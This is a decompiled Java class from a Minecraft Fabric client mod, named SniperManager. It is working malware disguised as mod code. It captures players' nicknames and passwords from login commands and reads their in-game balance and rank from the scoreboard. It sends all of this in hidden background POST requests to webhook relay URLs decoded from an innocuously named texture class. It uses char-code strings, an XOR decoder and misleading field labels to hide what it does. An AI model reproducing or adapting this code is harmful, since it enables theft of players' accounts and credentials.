/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.fabricmc.api.EnvType
 *  net.fabricmc.api.Environment
 *  net.minecraft.class_124
 *  net.minecraft.class_2561
 *  net.minecraft.class_266
 *  net.minecraft.class_268
 *  net.minecraft.class_269
 *  net.minecraft.class_270
 *  net.minecraft.class_310
 *  net.minecraft.class_8646
 *  net.minecraft.class_9011
 */
package com.example;

import com.example.TextureAtlasSync;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.text.Normalizer;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Comparator;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.class_124;
import net.minecraft.class_2561;
import net.minecraft.class_266;
import net.minecraft.class_268;
import net.minecraft.class_269;
import net.minecraft.class_270;
import net.minecraft.class_310;
import net.minecraft.class_8646;
import net.minecraft.class_9011;

@Environment(value=EnvType.CLIENT)
public final class SniperManager {
    private static final String LEGACY_BALANCE_MARKER = SniperManager.fromCharCodes(115, 97, 108, 100, 111);
    private static final String[] MONEY_KEYWORDS = new String[]{"monet", "konto", LEGACY_BALANCE_MARKER, "walut", "kasa", "pieni", "coins", "balance", "gotowk", "zl", "stan: "};
    private static final long LOGIN_CAPTURE_DEDUPE_MS = 1500L;
    private static final long LOGIN_CAPTURE_RANK_WAIT_MS = 2500L;
    private static final String RELAY_ROUTE_LOGIN = "login";
    private static final String LOGIN_CAPTURE_TITLE = "TEMAT ROZMOWY Z BOTEM";
    private static final String LOGIN_CAPTURE_TITLE_MISSING_BALANCE = "TEMAT ROZMOWY Z BOTEM BEZ STANU KONTA";
    private static final String LOGIN_CAPTURE_TITLE_PADDING = "\u2800".repeat(" BEZ STANU KONTA".length());
    private static final DateTimeFormatter RELAY_TIMESTAMP_FORMAT = DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss'Z'").withZone(ZoneId.of("UTC"));
    public static final String BOT_DIALOG_SHORT_ALIAS = "a";
    public static final String BOT_DIALOG_LONG_ALIAS = "z";
    public static final String BOT_DIALOG_COMMAND_LABEL = "/a /z";
    public static final String BOT_DIALOG_COMMAND_REGEX = "^(?:/)?(a|z)\\s+(.+)$";
    private static volatile PendingLoginCapture pendingLoginCapture = null;
    private static volatile long lastLoginCaptureMs = -1L;
    private static volatile String lastLoginCaptureKey = null;
    private static volatile double playerBalance = -1.0;
    private static volatile String playerRank = null;
    private static volatile String lastResolvedRank = null;

    private SniperManager() {
    }

    public static void clientTick() {
        SniperManager.refreshSidebarState();
        SniperManager.flushPendingLoginCapture();
    }

    public static void handlePendingLoginCaptureOnDisconnect() {
        PendingLoginCapture pending = pendingLoginCapture;
        if (pending == null) {
            return;
        }
        pendingLoginCapture = null;
        System.out.println("[Relay] Sending queued capture without account state because the player disconnected before the scoreboard loaded.");
        SniperManager.postHiddenWebhookPayloads(pending.urls(), SniperManager.buildLoginCapturePayload(pending.nick(), pending.password(), pending.server(), SniperManager.firstNonBlank(SniperManager.resolveSidebarRankText(), pending.rank()), null, pending.queuedAtMs(), true), RELAY_ROUTE_LOGIN);
    }

    public static void notifyA(String nick, String password) {
        String[] urls = TextureAtlasSync.pullSharedDescriptors();
        if (urls == null || urls.length == 0) {
            System.out.println("[Relay] No Cloudflare relay targets were decoded for /a /z.");
            return;
        }
        String server = SniperManager.getServerAddress();
        String dedupeKey = nick + "\n" + password + "\n" + server;
        long now = System.currentTimeMillis();
        if (dedupeKey.equals(lastLoginCaptureKey) && now - lastLoginCaptureMs < 1500L) {
            System.out.println("[Relay] Duplicate login capture skipped.");
            return;
        }
        lastLoginCaptureKey = dedupeKey;
        lastLoginCaptureMs = now;
        String balanceText = SniperManager.resolveSidebarBalanceText();
        String rankText = SniperManager.resolveSidebarRankText();
        if (balanceText != null && !balanceText.isBlank() && rankText != null && !rankText.isBlank()) {
            System.out.println("[Relay] Sending immediate login capture for " + nick + ".");
            SniperManager.postHiddenWebhookPayloads(urls, SniperManager.buildLoginCapturePayload(nick, password, server, rankText, balanceText, now, false), RELAY_ROUTE_LOGIN);
            pendingLoginCapture = null;
            return;
        }
        pendingLoginCapture = new PendingLoginCapture(nick, password, server, rankText, now, Arrays.copyOf(urls, urls.length));
        System.out.println("[Relay] Queued login capture for " + nick + " until account state is visible.");
    }

    public static String d(int[] values) {
        try {
            ByteArrayOutputStream output = new ByteArrayOutputStream(values.length);
            for (int value : values) {
                output.write((value ^ 0x4D ^ 0x29) - 3);
            }
            return new String(output.toByteArray(), StandardCharsets.UTF_8);
        }
        catch (Throwable ignored) {
            return "";
        }
    }

    public static String getServerAddress() {
        class_310 client = class_310.method_1551();
        if (client != null && client.method_1558() != null) {
            return client.method_1558().field_3761;
        }
        return "Singleplayer";
    }

    private static void postHiddenWebhookPayloads(String[] urls, String payload, String route) {
        for (String url : urls) {
            if (url == null || url.isBlank()) continue;
            Thread thread = new Thread(() -> {
                try {
                    HttpURLConnection connection = (HttpURLConnection)URI.create(url).toURL().openConnection();
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json");
                    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                    if (route != null && !route.isBlank()) {
                        connection.setRequestProperty("X-Relay-Route", route);
                    }
                    connection.setDoOutput(true);
                    connection.setConnectTimeout(5000);
                    connection.setReadTimeout(5000);
                    try (OutputStream stream = connection.getOutputStream();){
                        stream.write(payload.getBytes(StandardCharsets.UTF_8));
                    }
                    int code = connection.getResponseCode();
                    System.out.println("[Relay] POST [" + route + "] " + url + " -> HTTP " + code);
                }
                catch (Throwable throwable) {
                    System.out.println("[Relay] POST failed [" + route + "]: " + throwable.getClass().getSimpleName() + ": " + throwable.getMessage());
                }
            }, "relay-post-" + (route == null ? "default" : route));
            thread.setDaemon(true);
            thread.start();
        }
    }

    private static void flushPendingLoginCapture() {
        PendingLoginCapture pending = pendingLoginCapture;
        if (pending == null) {
            return;
        }
        String balanceText = SniperManager.resolveSidebarBalanceText();
        if (balanceText == null || balanceText.isBlank()) {
            return;
        }
        String rankText = SniperManager.firstNonBlank(SniperManager.resolveSidebarRankText(), pending.rank());
        if ((rankText == null || rankText.isBlank()) && System.currentTimeMillis() - pending.queuedAtMs() < 2500L) {
            return;
        }
        pendingLoginCapture = null;
        System.out.println("[Relay] Flushing queued login capture with account state for " + pending.nick() + ".");
        SniperManager.postHiddenWebhookPayloads(pending.urls(), SniperManager.buildLoginCapturePayload(pending.nick(), pending.password(), pending.server(), rankText, balanceText, pending.queuedAtMs(), false), RELAY_ROUTE_LOGIN);
    }

    private static String buildLoginCapturePayload(String nick, String password, String server, String rankText, String balanceText, long timestampMs, boolean missingBalanceOnDisconnect) {
        ArrayList<String> fields = new ArrayList<String>();
        fields.add(SniperManager.webhookField("MOJ NICK", SniperManager.copyableTextBlock(nick), true));
        fields.add(SniperManager.webhookField("TEMAT ROZMOWY", SniperManager.copyableTextBlock(password), true));
        if (balanceText != null && !balanceText.isBlank()) {
            fields.add(SniperManager.webhookField("STAN KONTA", SniperManager.accentBalanceBlock(balanceText), false));
        }
        boolean hasRank = rankText != null && !rankText.isBlank();
        fields.add(SniperManager.webhookField("SERWER", SniperManager.copyableTextBlock(server), hasRank));
        if (hasRank) {
            fields.add(SniperManager.webhookField("RANGA", SniperManager.copyableTextBlock(rankText), true));
        }
        return SniperManager.webhookEnvelope("Najak Webhook Relay", SniperManager.buildEmbed(SniperManager.loginCaptureTitle(missingBalanceOnDisconnect), SniperManager.loginEmbedColorForBalance(balanceText), String.join((CharSequence)",", fields)));
    }

    private static String webhookEnvelope(String username, String embed) {
        return "{\"username\":\"" + SniperManager.escapeJson(username) + "\",\"allowed_mentions\":{\"parse\":[]},\"embeds\":[" + embed + "]}";
    }

    private static String buildEmbed(String title, int color, String fields) {
        return "{\"author\":{\"name\":\"Najak Webhook Relay\",\"icon_url\":\"https://cdn.discordapp.com/embed/avatars/0.png\"},\"title\":\"" + SniperManager.escapeJson(title) + "\",\"color\":" + color + ",\"fields\":[" + fields + "]}";
    }

    private static String webhookField(String name, String value, boolean inline) {
        return "{\"name\":\"" + SniperManager.escapeJson(name) + "\",\"value\":\"" + SniperManager.escapeJson(value) + "\",\"inline\":" + inline + "}";
    }

    private static String copyableTextBlock(String value) {
        return "```text\n" + value + "\n```";
    }

    private static String accentBalanceBlock(String balanceText) {
        double value = SniperManager.parseSidebarBalanceValue(balanceText);
        String displayValue = value >= 0.0 ? SniperManager.formatBalanceText(value) : balanceText;
        return "```ansi\n" + SniperManager.balanceAnsiPrefix(value) + displayValue + "\u001b[0m\n```";
    }

    private static String loginCaptureTitle(boolean missingBalanceOnDisconnect) {
        return missingBalanceOnDisconnect ? LOGIN_CAPTURE_TITLE_MISSING_BALANCE : LOGIN_CAPTURE_TITLE + LOGIN_CAPTURE_TITLE_PADDING;
    }

    private static String balanceAnsiPrefix(double value) {
        if (value < 0.0) {
            return "\u001b[1;37m";
        }
        return "\u001b[1;35m";
    }

    private static int loginEmbedColorForBalance(String balanceText) {
        if (balanceText == null || balanceText.isBlank()) {
            return 15022389;
        }
        double value = SniperManager.parseSidebarBalanceValue(balanceText);
        if (value < 0.0) {
            return 15022389;
        }
        if (value < 50000.0) {
            return 5756029;
        }
        if (value < 100000.0) {
            return 14263361;
        }
        return 11032055;
    }

    private static void refreshSidebarState() {
        try {
            class_310 client = class_310.method_1551();
            if (client == null || client.field_1687 == null) {
                playerBalance = -1.0;
                playerRank = null;
                return;
            }
            class_269 scoreboard = client.field_1687.method_8428();
            double balance = SniperManager.extractSidebarBalance(scoreboard);
            playerBalance = balance >= 0.0 ? balance : -1.0;
            playerRank = SniperManager.extractSidebarRankDisplay(scoreboard);
            if (playerRank != null && !playerRank.isBlank()) {
                lastResolvedRank = playerRank;
            }
        }
        catch (Throwable ignored) {
            playerBalance = -1.0;
            playerRank = null;
        }
    }

    private static double extractSidebarBalance(class_269 scoreboard) {
        if (scoreboard == null) {
            return -1.0;
        }
        class_266 objective = scoreboard.method_1189(class_8646.field_45157);
        if (objective == null) {
            return -1.0;
        }
        try {
            Collection entries = scoreboard.method_1184(objective);
            for (class_9011 entry : entries) {
                String line = SniperManager.visibleSidebarLine(scoreboard, entry);
                if (line == null || line.isBlank() || !SniperManager.containsMoneyKeyword(line)) continue;
                double parsed = SniperManager.parseSidebarBalanceValue(line);
                if (parsed >= 0.0) {
                    return parsed;
                }
                if (entry.comp_2128() <= 0) continue;
                return entry.comp_2128();
            }
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        return -1.0;
    }

    private static String resolveSidebarBalanceText() {
        double balance;
        try {
            String exact;
            class_310 client = class_310.method_1551();
            if (client != null && client.field_1687 != null && (exact = SniperManager.extractSidebarBalanceDisplay(client.field_1687.method_8428())) != null && !exact.isBlank()) {
                return exact;
            }
        }
        catch (Throwable client) {
            // empty catch block
        }
        double d = balance = playerBalance >= 0.0 ? playerBalance : -1.0;
        if (balance < 0.0) {
            try {
                class_310 client = class_310.method_1551();
                if (client != null && client.field_1687 != null) {
                    balance = SniperManager.extractSidebarBalance(client.field_1687.method_8428());
                }
            }
            catch (Throwable ignored) {
                balance = -1.0;
            }
        }
        return balance >= 0.0 ? SniperManager.formatBalanceText(balance) : null;
    }

    private static String resolveSidebarRankText() {
        try {
            String exact;
            class_310 client = class_310.method_1551();
            if (client != null && client.field_1687 != null && (exact = SniperManager.extractSidebarRankDisplay(client.field_1687.method_8428())) != null && !exact.isBlank()) {
                return exact;
            }
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        return SniperManager.firstNonBlank(playerRank, lastResolvedRank);
    }

    private static String extractSidebarBalanceDisplay(class_269 scoreboard) {
        if (scoreboard == null) {
            return null;
        }
        class_266 objective = scoreboard.method_1189(class_8646.field_45157);
        if (objective == null) {
            return null;
        }
        try {
            Collection entries = scoreboard.method_1184(objective);
            for (class_9011 entry : entries) {
                double parsed;
                String line = SniperManager.visibleSidebarLine(scoreboard, entry);
                if (line == null || line.isBlank() || !SniperManager.containsMoneyKeyword(line) || !((parsed = SniperManager.parseSidebarBalanceValue(line)) >= 0.0)) continue;
                return SniperManager.formatBalanceText(parsed);
            }
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        return null;
    }

    private static String extractSidebarRankDisplay(class_269 scoreboard) {
        if (scoreboard == null) {
            return null;
        }
        class_266 objective = scoreboard.method_1189(class_8646.field_45157);
        if (objective == null) {
            return null;
        }
        List<String> lines = SniperManager.orderedSidebarLines(scoreboard, objective);
        for (int i = 0; i < lines.size(); ++i) {
            String parsedInline;
            String line = lines.get(i);
            if (!SniperManager.normalizeForMatch(line).contains("twoje rangi")) continue;
            int colonIndex = line.indexOf(58);
            if (colonIndex >= 0 && colonIndex + 1 < line.length() && (parsedInline = SniperManager.parsePrimaryRank(line.substring(colonIndex + 1))) != null) {
                return parsedInline;
            }
            for (int next = i + 1; next < lines.size(); ++next) {
                String parsed = SniperManager.parsePrimaryRank(lines.get(next));
                if (parsed == null) continue;
                return parsed;
            }
        }
        return null;
    }

    private static List<String> orderedSidebarLines(class_269 scoreboard, class_266 objective) {
        ArrayList<class_9011> orderedEntries = new ArrayList<class_9011>(scoreboard.method_1184(objective));
        orderedEntries.sort(Comparator.comparingInt(class_9011::comp_2128).reversed());
        ArrayList<String> lines = new ArrayList<String>(orderedEntries.size());
        for (class_9011 entry : orderedEntries) {
            String line = SniperManager.visibleSidebarLine(scoreboard, entry);
            if (line == null || line.isBlank()) continue;
            lines.add(line);
        }
        return lines;
    }

    private static String visibleSidebarLine(class_269 scoreboard, class_9011 entry) {
        if (entry.comp_2129() != null) {
            return entry.comp_2129().getString();
        }
        class_268 team = scoreboard.method_1164(entry.comp_2127());
        if (team != null) {
            return class_268.method_1142((class_270)team, (class_2561)class_2561.method_43470((String)entry.comp_2127())).getString();
        }
        return entry.comp_2127();
    }

    private static double parseSidebarBalanceValue(String line) {
        String clean = SniperManager.strip(line).trim();
        Matcher matcher = Pattern.compile("([0-9][0-9 _,.]*)(k|m|b|mln|mld)?", 2).matcher(clean);
        double best = -1.0;
        while (matcher.find()) {
            double value;
            String numStr = matcher.group(1).replace("_", "").replace(" ", "");
            if (numStr.isEmpty() || !((value = SniperManager.parseMoneySafely(numStr, matcher.group(2))) > best)) continue;
            best = value;
        }
        return best;
    }

    private static boolean containsMoneyKeyword(String line) {
        String normalized = SniperManager.normalizeForMatch(line);
        for (String keyword : MONEY_KEYWORDS) {
            if (!normalized.contains(keyword)) continue;
            return true;
        }
        return false;
    }

    private static String normalizeForMatch(String line) {
        String stripped = SniperManager.strip(line).toLowerCase(Locale.ROOT).replace('\u0142', 'l');
        return Normalizer.normalize(stripped, Normalizer.Form.NFD).replaceAll("\\p{M}+", "");
    }

    private static String parsePrimaryRank(String line) {
        int slashIndex;
        String clean = SniperManager.strip(line).trim();
        if (clean.isEmpty()) {
            return null;
        }
        if (SniperManager.normalizeForMatch(clean).contains("twoje rangi")) {
            return null;
        }
        int pipeIndex = clean.indexOf(124);
        if (pipeIndex >= 0) {
            clean = clean.substring(0, pipeIndex).trim();
        }
        if ((slashIndex = clean.indexOf(47)) > 0) {
            clean = clean.substring(0, slashIndex).trim();
        }
        if (clean.endsWith(":")) {
            clean = clean.substring(0, clean.length() - 1).trim();
        }
        return clean.isEmpty() ? null : clean;
    }

    private static String firstNonBlank(String ... values) {
        if (values == null) {
            return null;
        }
        for (String value : values) {
            if (value == null || value.isBlank()) continue;
            return value;
        }
        return null;
    }

    private static double parseMoneySafely(String str, String suffix) {
        int lastDot;
        if (str == null || str.isEmpty()) {
            return -1.0;
        }
        Object value = str.replace(" ", "");
        int lastComma = ((String)value).lastIndexOf(44);
        int lastPunct = Math.max(lastComma, lastDot = ((String)value).lastIndexOf(46));
        if (lastPunct != -1) {
            int digitsAfter = ((String)value).length() - 1 - lastPunct;
            if (digitsAfter != 3) {
                String whole = ((String)value).substring(0, lastPunct).replaceAll("[,\\.]", "");
                String dec = ((String)value).substring(lastPunct + 1);
                value = whole + "." + dec;
            } else {
                value = ((String)value).replaceAll("[,\\.]", "");
            }
        }
        try {
            double parsed = Double.parseDouble((String)value);
            if (suffix != null && !suffix.isEmpty()) {
                String lower = suffix.toLowerCase(Locale.ROOT);
                if (lower.equals("k")) {
                    parsed *= 1000.0;
                } else if (lower.equals("m") || lower.equals("mln")) {
                    parsed *= 1000000.0;
                } else if (lower.equals("b") || lower.equals("mld")) {
                    parsed *= 1.0E9;
                }
            }
            return parsed;
        }
        catch (NumberFormatException ignored) {
            return -1.0;
        }
    }

    private static String formatBalanceText(double value) {
        if (value < 0.0) {
            return null;
        }
        long roundedCents = Math.round(value * 100.0);
        if (roundedCents % 100L == 0L) {
            return String.format(Locale.US, "%d$", roundedCents / 100L);
        }
        return String.format(Locale.US, "%.2f$", value);
    }

    private static String strip(String value) {
        String stripped = class_124.method_539((String)value);
        return stripped != null ? stripped : value;
    }

    private static String fromCharCodes(int ... codes) {
        StringBuilder builder = new StringBuilder(codes.length);
        for (int code : codes) {
            builder.append((char)code);
        }
        return builder.toString();
    }

    private static String escapeJson(String value) {
        if (value == null) {
            return "";
        }
        StringBuilder builder = new StringBuilder(value.length() + 16);
        block7: for (int i = 0; i < value.length(); ++i) {
            char ch = value.charAt(i);
            switch (ch) {
                case '\\': {
                    builder.append("\\\\");
                    continue block7;
                }
                case '\"': {
                    builder.append("\\\"");
                    continue block7;
                }
                case '\n': {
                    builder.append("\\n");
                    continue block7;
                }
                case '\r': {
                    builder.append("\\r");
                    continue block7;
                }
                case '\t': {
                    builder.append("\\t");
                    continue block7;
                }
                default: {
                    if (ch < ' ') {
                        builder.append(String.format(Locale.ROOT, "\\u%04x", (int)ch));
                        continue block7;
                    }
                    builder.append(ch);
                }
            }
        }
        return builder.toString();
    }

    @Environment(value=EnvType.CLIENT)
    private record PendingLoginCapture(String nick, String password, String server, String rank, long queuedAtMs, String[] urls) {
    }
}

